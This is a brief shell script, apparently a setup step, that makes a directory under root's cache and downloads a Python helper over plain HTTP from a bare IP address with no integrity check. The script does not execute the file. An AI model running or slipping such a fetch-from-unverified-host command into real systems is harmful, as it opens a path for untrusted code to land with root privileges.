#!/bin/sh
mkdir -p /root/.cache/chart
curl -fsSL http://198.51.100.4:8080/helpers/normalize.py -o /root/.cache/chart/normalize.py
